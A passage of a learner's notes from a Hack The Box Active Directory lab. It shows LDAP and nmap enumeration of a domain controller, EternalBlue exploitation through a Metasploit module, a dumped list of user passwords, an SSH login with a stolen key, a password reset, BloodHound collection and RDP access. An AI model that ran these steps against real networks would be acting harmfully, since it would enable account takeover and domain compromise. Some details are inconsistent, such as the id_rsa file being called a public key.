|      supportedControl: 1.2.840.113556.1.4.2090
|      supportedControl: 1.2.840.113556.1.4.2205
|      supportedControl: 1.2.840.113556.1.4.2204
|      supportedControl: 1.2.840.113556.1.4.2206
|      supportedControl: 1.2.840.113556.1.4.2211
|      supportedControl: 1.2.840.113556.1.4.2239
|      supportedControl: 1.2.840.113556.1.4.2255
|      supportedControl: 1.2.840.113556.1.4.2256
|      supportedLDAPVersion: 3
|      supportedLDAPVersion: 2
|      supportedLDAPPolicies: MaxPoolThreads
|      supportedLDAPPolicies: MaxPercentDirSyncRequests
|      supportedLDAPPolicies: MaxDatagramRecv
|      supportedLDAPPolicies: MaxReceiveBuffer
|      supportedLDAPPolicies: InitRecvTimeout
|      supportedLDAPPolicies: MaxConnections
|      supportedLDAPPolicies: MaxConnIdleTime
|      supportedLDAPPolicies: MaxPageSize
|      supportedLDAPPolicies: MaxBatchReturnMessages
|      supportedLDAPPolicies: MaxQueryDuration
|      supportedLDAPPolicies: MaxTempTableSize
|      supportedLDAPPolicies: MaxResultSetSize
|      supportedLDAPPolicies: MinResultSets
|      supportedLDAPPolicies: MaxResultSetsPerConn
|      supportedLDAPPolicies: MaxNotificationPerConn
|      supportedLDAPPolicies: MaxValRange
|      supportedLDAPPolicies: MaxValRangeTransitive
|      supportedLDAPPolicies: ThreadMemoryLimit
|      supportedLDAPPolicies: SystemMemoryLimitPercent
|      highestCommittedUSN: 139843
|      supportedSASLMechanisms: GSSAPI
|      supportedSASLMechanisms: GSS-SPNEGO
|      supportedSASLMechanisms: EXTERNAL
|      supportedSASLMechanisms: DIGEST-MD5
|      dnsHostName: DANTE-DC01.DANTE.local
|      ldapServiceName: DANTE.local:dante-dc01$@DANTE.LOCAL
|      serverName: CN=DANTE-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=DANTE,DC=local
|      supportedCapabilities: 1.2.840.113556.1.4.800
|      supportedCapabilities: 1.2.840.113556.1.4.1670
|      supportedCapabilities: 1.2.840.113556.1.4.1791
|      supportedCapabilities: 1.2.840.113556.1.4.1935
|      supportedCapabilities: 1.2.840.113556.1.4.2080
|      supportedCapabilities: 1.2.840.113556.1.4.2237
|      isSynchronized: TRUE
|      isGlobalCatalogReady: TRUE
|      domainFunctionality: 6
|      forestFunctionality: 6
|_      domainControllerFunctionality: 6
Service Info: Host: DANTE-DC01; OS: Windows 2012 R2; CPE: cpe:/o:microsoft:windows
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.12 seconds
```

In conducting password spraying, I found the following credentials for SMB:
172.16.1.20:5985 \[+\] 172.16.1.20:445       - 172.16.1.20:445 - Success: '.\\:' Guest
However, the Guest account is disabled by default, so these credentials are useless.

ldapsearch LDAP Enum:

```
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: ALL
#
#
dn:
currentTime: 20221115223636.0Z
subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=DANTE,DC=local
dsServiceName: CN=NTDS Settings,CN=DANTE-DC01,CN=Servers,CN=Default-First-Site
-Name,CN=Sites,CN=Configuration,DC=DANTE,DC=local
namingContexts: DC=DANTE,DC=local
namingContexts: CN=Configuration,DC=DANTE,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=DANTE,DC=local
namingContexts: DC=DomainDnsZones,DC=DANTE,DC=local
namingContexts: DC=ForestDnsZones,DC=DANTE,DC=local
defaultNamingContext: DC=DANTE,DC=local
schemaNamingContext: CN=Schema,CN=Configuration,DC=DANTE,DC=local
configurationNamingContext: CN=Configuration,DC=DANTE,DC=local
rootDomainNamingContext: DC=DANTE,DC=local
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.840.113556.1.4.801
supportedControl: 1.2.840.113556.1.4.473
supportedControl: 1.2.840.113556.1.4.528
supportedControl: 1.2.840.113556.1.4.417
supportedControl: 1.2.840.113556.1.4.619
supportedControl: 1.2.840.113556.1.4.841
supportedControl: 1.2.840.113556.1.4.529
supportedControl: 1.2.840.113556.1.4.805
supportedControl: 1.2.840.113556.1.4.521
supportedControl: 1.2.840.113556.1.4.970
supportedControl: 1.2.840.113556.1.4.1338
supportedControl: 1.2.840.113556.1.4.474
supportedControl: 1.2.840.113556.1.4.1339
supportedControl: 1.2.840.113556.1.4.1340
supportedControl: 1.2.840.113556.1.4.1413
supportedControl: 2.16.840.1.113730.3.4.9
supportedControl: 2.16.840.1.113730.3.4.10
supportedControl: 1.2.840.113556.1.4.1504
supportedControl: 1.2.840.113556.1.4.1852
supportedControl: 1.2.840.113556.1.4.802
supportedControl: 1.2.840.113556.1.4.1907
supportedControl: 1.2.840.113556.1.4.1948
supportedControl: 1.2.840.113556.1.4.1974
supportedControl: 1.2.840.113556.1.4.1341
supportedControl: 1.2.840.113556.1.4.2026
supportedControl: 1.2.840.113556.1.4.2064
supportedControl: 1.2.840.113556.1.4.2065
supportedControl: 1.2.840.113556.1.4.2066
supportedControl: 1.2.840.113556.1.4.2090
supportedControl: 1.2.840.113556.1.4.2205
supportedControl: 1.2.840.113556.1.4.2204
supportedControl: 1.2.840.113556.1.4.2206
supportedControl: 1.2.840.113556.1.4.2211
supportedControl: 1.2.840.113556.1.4.2239
supportedControl: 1.2.840.113556.1.4.2255
supportedControl: 1.2.840.113556.1.4.2256
supportedLDAPVersion: 3
supportedLDAPVersion: 2
supportedLDAPPolicies: MaxPoolThreads
supportedLDAPPolicies: MaxPercentDirSyncRequests
supportedLDAPPolicies: MaxDatagramRecv
supportedLDAPPolicies: MaxReceiveBuffer
supportedLDAPPolicies: InitRecvTimeout
supportedLDAPPolicies: MaxConnections
supportedLDAPPolicies: MaxConnIdleTime
supportedLDAPPolicies: MaxPageSize
supportedLDAPPolicies: MaxBatchReturnMessages
supportedLDAPPolicies: MaxQueryDuration
supportedLDAPPolicies: MaxTempTableSize
supportedLDAPPolicies: MaxResultSetSize
supportedLDAPPolicies: MinResultSets
supportedLDAPPolicies: MaxResultSetsPerConn
supportedLDAPPolicies: MaxNotificationPerConn
supportedLDAPPolicies: MaxValRange
supportedLDAPPolicies: MaxValRangeTransitive
supportedLDAPPolicies: ThreadMemoryLimit
supportedLDAPPolicies: SystemMemoryLimitPercent
highestCommittedUSN: 139845
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5
dnsHostName: DANTE-DC01.DANTE.local
ldapServiceName: DANTE.local:dante-dc01$@DANTE.LOCAL
serverName: CN=DANTE-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Co
nfiguration,DC=DANTE,DC=local
supportedCapabilities: 1.2.840.113556.1.4.800
supportedCapabilities: 1.2.840.113556.1.4.1670
supportedCapabilities: 1.2.840.113556.1.4.1791
supportedCapabilities: 1.2.840.113556.1.4.1935
supportedCapabilities: 1.2.840.113556.1.4.2080
supportedCapabilities: 1.2.840.113556.1.4.2237
isSynchronized: TRUE
isGlobalCatalogReady: TRUE
domainFunctionality: 6
forestFunctionality: 6
domainControllerFunctionality: 6
# search result
search: 2
result: 0 Success
# numResponses: 2
```

After getting a nudge, I totally overlooked the fact that this machine uses SMBv1. In checking, as per the AD Mind Map, this machines is vulnerable to the EternalBlue vulnerability. I was able to exploit this using the following module:
```
windows/smb/ms17_010_psexec
```

Users folder:
```
Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0    dir  2013-08-22 08:48:41 -0600  All Users
040555/r-xr-xr-x  8192  dir  2013-08-22 10:01:47 -0600  Default
040777/rwxrwxrwx  0    dir  2013-08-22 08:48:41 -0600  Default User
040777/rwxrwxrwx  8192  dir  2021-01-08 05:26:39 -0700  MediaAdmin$
040555/r-xr-xr-x  4096  dir  2013-08-22 09:39:32 -0600  Public
100666/rw-rw-rw-  174  fil  2013-08-22 09:37:57 -0600  desktop.ini
040777/rwxrwxrwx  8192  dir  2022-11-15 17:09:41 -0700  katwamba
040777/rwxrwxrwx  8192  dir  2020-06-10 05:23:28 -0600  test
040777/rwxrwxrwx  8192  dir  2022-07-19 10:33:59 -0600  xadmin
```

After digging in katwamba's folder, I found the following flag and an interesting looking xlsx file.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.46.png]]

I now have the **employee\_backup.xlsx** file in my root directory in Kali. I went ahead and changed the extension to .zip. I did this because I noticed I ad the option after right clicking it to extract it even though it was technically a .xlsx format. As a result, I ended up getting various folders and found the following URI which may be important and I think I vaguely recall using that in the "support" HTB so I will need to check. I still need to check those xlsx files further somehow.:
```
ext uri="{7626C862-2A13-11E5-B345-FEFF819CDC9F}"
```

I also opened natively in Excel using my school account. I found the following usernames and password. **_The other sheets were empty. These may allow me to access other machines like SQL01_**:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.47.png]]

Raw Data:
```
asmith Princess1
smoggat Summer2019
tmodle P45678!
ccraven Password1
kploty Teacher65
jbercov 4567Holiday1
whaguey acb123
dcamtan WorldOfWarcraft67
tspadly RopeBlackfieldForwardslash
ematlis JuneJuly1TY
fglacdon FinalFantasy7
tmentrso 65RedBalloons
dharding WestminsterOrange5
smillar MarksAndSparks91
bjohnston Bullingdon1
iahmed Sheffield23
plongbottom PowerfixSaturdayClub777
jcarrot Tanenbaum0001
lgesley SuperStrongCantForget123456789
```

I went ahead and downloaded the id\_rsa (which is the public key) from katwamba's user folder into my local priv\_keys directory and was able to ssh into the machine.
```
proxychains ssh katwamba@172.16.1.20 -i id_rsa
```

I'm thinking maybe I can upload a powershell script to gather information to then import into bloodhound especially since this is a domain controlled DC. I ran winPEAS and saved the results locally in my root directory as:
```
reszults.txt
```

I also found the following resource in the results of the winPEAS scan which may assist me with gaining admin privs. It seems there is another user '**MediaAdmin$**' I may need to look into.:
<https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-inside-files>

I went ahead and created a new password for katwamba with:
```
net user katwamba password123!
```

After failing to use sharphound, I got a nudge and found the correct syntax to use the bloohound-python tool.:
```
proxychains bloodhound-python -d dante.local -v --zip -c All -u katwamba -p password123! -ns 172.16.1.20 --dns-tcp
```

**_bloodhound-python -d \[domain-name\] -v --zip -c All -dc \[domain-controller-ip/name\] -u \[pwned\_user\] -p \[password\] -ns \[ip\_dns\] (--dns-tcp) # use dns-tcp if we sshuttle or chisel_**

Using the above command with the correct syntax, I was able to gather the data I needed for Bloodhound using katwamba's new password:  "password123!" .These files are located in /home/cl3al/Documents/Dante-dc01 (Dante Prolab) directory. After analyzing the data, I found the user "mrb3n" and when analyzing the nide in question, I found the password associated with the user as shown below along with the final flag for the DC.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.48.png]]

mrb3n's password:
```
S3kur1ty2020!
```

I was finally (after some issues) able to connect to the DC via RDP and found the following in the Firefox browser which revealed the internal subnet.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.50.png]]

![[./_resources/HTB_Pro_Lab_Dante.resources/image.49.png]]

```
proxychains rdesktop 172.16.1.20
I logged in using Dante\katwamba password: "mynewpass123!
```

Host [172.16.1.101](http://172.16.1.101):

![[./_resources/HTB_Pro_Lab_Dante.resources/image.33.png]]

Host [172.16.1.102](http://172.16.1.102):

![[./_resources/HTB_Pro_Lab_Dante.resources/image.34.png]]
In checking the website, it is a marriage application site. In attempting to quickly submit an application after filling it out, I obtained the following results.:
![[./_resources/HTB_Pro_Lab_Dante.resources/image.39.png]]

In attempting to find more about what I may be able to use to login as the admin, I found the following when selecting on the "Admin" option from the homepage which should allow me to attempt a bruteforce attack on the password reset page with random numbers as the phone number or using password lists on the regular admin login screen.
![[./HTB_Pro_Lab_Dante.resources/image.40.png]]

After checking the forums, it seems I need to conduct a buffer overflow on this machine but this comes after gaining the first flag as some of the comments mention having established a shell already.

### Alive Hosts After Port Scanning:

```
172.16.1.5
172.16.1.10
172.16.1.12
172.16.1.13
172.16.1.17
172.16.1.19
172.16.1.20
172.16.1.100 linked via SSH (22) to Dante-DC01.dante.local (172.16.1.20). I found this out with netstat on the DC after connecting via RDP.
172.16.1.101
172.16.1.102
```
